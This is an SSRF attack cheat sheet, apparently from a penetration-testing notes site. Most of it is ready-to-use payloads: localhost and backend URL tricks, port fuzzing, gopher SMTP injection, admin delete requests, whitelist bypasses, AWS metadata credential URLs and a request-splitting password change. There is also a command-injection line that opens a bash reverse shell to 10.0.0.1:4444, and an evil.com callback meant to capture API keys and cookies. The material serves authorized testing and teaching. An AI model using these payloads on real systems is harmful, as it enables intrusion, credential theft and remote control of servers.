---
title: SSRF (Server-Side Request Forgery)
description: SSRF is a type of exploit where an attacker abuses the functionality of a server causing it to access or manipulate information in the realm of that server that would otherwise not be directly accessibleto the attacker. SSRF is an attack against a server.
tags:
    - Web
refs:
date: 2023-09-09
draft: false
---

## Capture Tools

If you want to capture the SSRF affections, there are some online tools available for capturing SSRF.

- **[Webhook.site](https://webhook.site/)**
- **[pingb.in](http://pingb.in/)**
- **[Ngrok](https://ngrok.com/)**
- **[interactsh](https://github.com/projectdiscovery/interactsh)**

    ```sh
    interactsh-client -v
    ```

Or we can simply open local web server if local machine accepts external requests.

```bash
python3 -m http.server 8000
```

<br />

## HTTP (http://)

We may be able to use another server in the target machine.  
For example, pass the localhost URL to the GET parameters.  
Also These are available in POST params.

```sh
# Localhost
?url=http://localhost/
?url=http://127.0.0.1/
?url=http://127.0.0.1:80/
?url=http://127.0.0.1:3000/
?url=http://127.0.0.1:8000/
?url=http://127.0.0.1:8080/
?url=http://0/
?url=http://2130706433/
?url=http://017700000001/
?url=http://127.1/
?url=http://127.0.0.1/test.php%00
?url=http://127.0.0.1/test.php\x00

# Backend URL (e.g. 192.168.0.x)
?url=http://192.168.0.23/
?url=http://192.168.0.23:80/
?url=http://192.168.0.23:3000/
?url=http://192.168.0.23:8000/
?url=http://192.168.0.23:8080/

# Server status
?url=http://localhost/server-status

# At sign
?url=test@sub.example.com/index.php
```

### Local Port Enumeration

We can find which port is opening by fuzzing port number.

```bash
seq 1 65535 | ffuf -u https://example.com/?url=http://127.0.0.1:FUZZ -w -
```

<br />

## Gopher (gopher://)

We may be able to use **`gopher://`** scheme.

### Automation

We can use [Gopherus](https://github.com/tarunkant/Gopherus) to create a payload automatically.

### SMTP

At first, we need to prepare a payload for sending message to victim user.

```bash
gopher://127.0.0.1:25/_MAIL FROM:<john@example.com>
RCPT TO:<mike@example.com>
DATA
From:john@gofer.htb
Subject:Test
Hi, I'm not hacker.
.
```

The payload above can be URL encoded with tools such as CyberChef.  Then the encoded payload is as follow.

```bash
gopher://127.0.0.1:25/_MAIL%20FROM:%3Cjohn@example.com%3E%0ARCPT%20TO:%3Cmike@example.com%3E%0ADATA%0AFrom:john@gofer.htb%0ASubject:Test%0AHi,%20I'm%20not%20hacker.%0A.
```

We can use it to SSRF.

```bash
?url=gopher://127.0.0.1:25/_MAIL...
```

<br />

## Listen HTTP Request

If the website is vulnerable to SSRF, we can fetch sensitive information in HTTP request by sniffing.  
First off, start a listener in local machine.

```bash
sudo nc -lvp 80
```

Then send request that is affected by SSRF.

```bash
https://example.com/mail?server=http://evil.com
```

See the HTTP request in local machine.  
We might be able to fetch the sensitive data such as API key, Cookie, etc.

<br />

## OS Command Injection

```bash
?url=http://127.0.0.1:3000/test;whoami
?url=http://127.0.0.1:3000/test;ping+-c+1+10.0.0.1
# Reverse Shell
?url=http://127.0.0.1:3000/;bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
```

<br />

## Admin Operations

We may be able to operate significant stuff as the admin user via local server.

```sh
# Localhost
?url=http://localhost/admin
?url=http://localhost/admin/delete?username=john
?url=http://127.1/%25%36%31dmin

# Backend URL (e.g. 192.168.0.x)
?url=http://192.168.0.23/admin
?url=http://192.168.0.23/admin/delete?username=john
```

<br />

## Whitelisted URL Bypass

If the target website allows only the whitelisted URL, we can use them.  
Assume only "example.com" is allowed by the target website.

```sh
?url=http://localhost@example.com/
?url=http://localhost%25%32%33@example.com/
```

<br />

## Open Redirect

```sh
key=/post/next?path=http://localhost/admin
```

<br />

## AWS Instances

```bash
?url=http://169.254.169.254/latest/dynamic/instance-identity/
?url=http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
```

<br />

## Hostname Bypass

### 1. Add Target Domain to /etc/hosts in Local Machine

```sh
x.x.x.x sub.example.com
```

Restart the hostname service to apply the configuration imediately.

```sh
sudo systemctl restart systemd-hostnamed
```

### 2. Access to the Domain We Specified**

```txt
https://example.com/?proxy=https://sub.example.com
```

<br />

## API Request

We might be able to get information from an API endpoint that is not accessible normally.

```bash
?url=https://api.example.com/users
?url=https://api.example.com@internal-api.example.com/users
```

<br />

## Reveal Filtered Websites via Monitoring Tools (Webhook)

Some web apps may have monitoring tools that check the health of external websites.  
You may be able to reveal hidden contents of the target via the monitor.  
First off, create a redirect server using Python. Here it’s named “redirect.py”.

```py
#!/usr/bin/python3
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

class Redirect(BaseHTTPRequestHandler):
  def do_GET(self):
      self.send_response(302)
      self.send_header('Location', sys.argv[1])
      self.end_headers()

HTTPServer(("0.0.0.0", 8000), Redirect).serve_forever()
```

After creating, run the following command.  
Assume that the filtered port is 3000 (nmap will reveal it).

```sh
python3 redirect.py http://127.0.0.1:3000
```

And start listener for receiving the POST request of the webhook from the target website.

```sh
nc -lvnp 4444
```

Now set the configuration of the webhook. For example:

```txt
Payload URL: http://<local-ip>:4444/
Monitored URL: http://<local-ip>:8000/
```

You can see the contents of the filtered app.

<br />

## Request Splitting

Reference: [https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/](https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/)

It is the vulnerability of the Node.js **`http.get`** module, which allows attacker to insert HTTP headers and bodies by splitting request.  
First off, prepare HTTP headers and body as below:

```html
HTTP/1.1

POST /update HTTP1.1
Content-Length: 28

username=admin&password=newpass

GET
```

Then manipulate it for sending to target.

```bash
# \u0120: space
# \u010D: \r
# \u010A: \n
?url=http://example.com\u0120HTTP/1.1\u010D\u010APOST\u0120/update\u0120HTTP/1.1\u010D\u010AContent-Length:\u012028\u010D\u010A\u010D\u010Ausername=admin&password=pass\u010D\u010A\u010D\u010AGET\u0120
```
